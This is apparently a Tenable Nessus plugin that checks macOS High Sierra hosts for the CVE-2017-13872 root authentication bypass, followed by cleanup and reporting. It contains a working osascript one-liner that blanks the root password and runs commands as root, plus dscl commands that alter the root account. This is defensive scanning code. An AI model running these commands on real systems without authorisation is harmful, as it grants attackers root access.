#TRUSTED 3a80128a5221bd6ca9737d3ed4b168a220dea197208c0de04b99d9a336561feef683e80edcedacedce309b3e0999873aa68be2596b7ed748be3fa6f807cf4be4199eec4fd2e493a9d959039e3f6a534501ecbad396593ce6ecf4eb5133d24ea9a6774d70d5331e23508d9f4d234cdc693da403d410c7d479ae78eb33e3eb77e12b44859fa4549127ad4337a9077d9b7b5114867df767b9b4ec2f06258457a01df46ab5599511a4a6fd9f16c8c0e25d24ed8f08b5d0973586fb2498b66927f9160d71063ddd368fbb7a90859ff2f59d534b93311f317920c45633d7eeb9673ea79cf2a392c880d57ff07e592c5ea4b5112f605983b46297a1ac239219a6505944e5656bc5194b7aafa59591a238abf1eb5087f6340be387da93d72575fc4786b678d71bfab915aadc329043cc9ad8cc1d48d08c89a5fe04097b4f3c70f893eb9bb53eed51077785a476b28812bc9add23805bbb8603829bb6e82c18a8b5d3a5a8b65d1eb66ac0f137455cdd67e314e672a56c337bd09cf0175d479069efac124b6882044863b6d76f0dc0dd29cb9fde205c82c73f0b442de8e782d659ccbddb753144d30aec0f6939ac4ad69a2e4587e5c17bf1811d16d0b2a6b5c3d10d235ca1691e49db274a038d6db74b056be99badf256892d7840849bc54d2033820cd28106f0404fc191f2f1d16e8214822b6d04d11b42515ce803e51845292eb81727c7
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(104848);
  script_version("1.11");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/06/29");

  script_cve_id("CVE-2017-13872");
  script_bugtraq_id(101981);

  script_name(english:"macOS 10.13 root Authentication Bypass Direct Check");
  script_summary(english:"Checks if the root password can be blanked out.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a version of macOS that is affected by a
root authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of macOS that has a root
authentication bypass vulnerability. A local attacker or a remote
attacker with credentials for a standard user account has the ability
to blank out the root account password. This can allow an attacker to
escalate privileges to root and execute commands and read files as a
system administrator.");
  script_set_attribute(attribute:"see_also", value:"https://support.apple.com/en-us/HT208315");
  # https://objective-see.com/blog/blog_0x24.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2cf4b55a");
  # https://twitter.com/lemiorhan/status/935578694541770752
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9ff9ff45");
  # https://www.theregister.co.uk/2017/11/28/root_access_bypass_macos_high_sierra/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1e5890f3");
  # https://www.theverge.com/2017/11/28/16711782/apple-macos-high-sierra-critical-password-security-flaw
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f367aab4");
  # https://support.apple.com/en-us/HT204012
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f9f9bbc3");
  script_set_attribute(attribute:"solution", value:
"Enable the root account and set a strong root account password.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-13872");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Mac OS X Root Privilege Escalation');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/11/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/11/29");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:apple:mac_os_x");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:apple:macos");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"MacOS X Local Security Checks");

  script_copyright(english:"This script is Copyright (C) 2017-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_get_info.nasl");
  script_require_keys("Host/local_checks_enabled", "Host/MacOSX/Version");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssh_func.inc");
include("macosx_func.inc");

if(sshlib::get_support_level() >= sshlib::SSH_LIB_SUPPORTS_COMMANDS ||
    get_one_kb_item('HostLevelChecks/proto') == 'local')
  enable_ssh_wrappers();
else disable_ssh_wrappers();

if (!get_kb_item("Host/local_checks_enabled")) audit(AUDIT_LOCAL_CHECKS_NOT_ENABLED);

os = get_kb_item("Host/MacOSX/Version");
if (!os) audit(AUDIT_OS_NOT, "macOS");
if (os !~ "Mac OS X 10\.13([^0-9]|$)") audit(AUDIT_OS_NOT, "macOS 10.13");

# check we're not root first
results = exec_cmd(cmd:"id");
if ("uid=0(root)" >< results)
  audit(AUDIT_HOST_NOT, "affected");

id_cmd = '/usr/bin/osascript -e \'do shell script "id" user name "root" password "" with administrator privileges\'';
results = exec_cmd(cmd:id_cmd);
# if we're vuln, the first time blanks the password, second time runs id
results = exec_cmd(cmd:id_cmd);

if ("uid=0(root)" >!< results)
{
  # not vuln
  audit(AUDIT_HOST_NOT, "vulnerable either because a root password is set or the vulnerability has been patched");
}

# if we are vulnerable we need to do some cleanup to
# set the system state back to pre-exploit
# this disables the root account and resets
# the password back to not blank
cmd = '/usr/bin/osascript -e \'do shell script "dscl . -create /Users/root passwd \'\\*\'" user name "root" password "" with administrator privileges\'';
exec_cmd(cmd:cmd);
cmd = '/usr/bin/osascript -e \'do shell script "dscl . -delete /Users/root authentication_authority" user name "root" password "" with administrator privileges\'';
exec_cmd(cmd:cmd);
cmd = '/usr/bin/osascript -e \'do shell script "dscl . -delete /Users/root ShadowHashData" user name "root" password "" with administrator privileges\'';
exec_cmd(cmd:cmd);

report = '  Nessus was able to execute commands as root by\n' +
         '  first blanking the root account password and then\n' +
         '  running "id" by using this command twice:\n' +
         '\n' +
         '  ' + id_cmd + '\n' +
         '\n' +
         '  which produced the following output:\n' +
         '\n' +
         '  ' + results + '\n';

security_report_v4(port:0, severity:SECURITY_HOLE, extra:report);
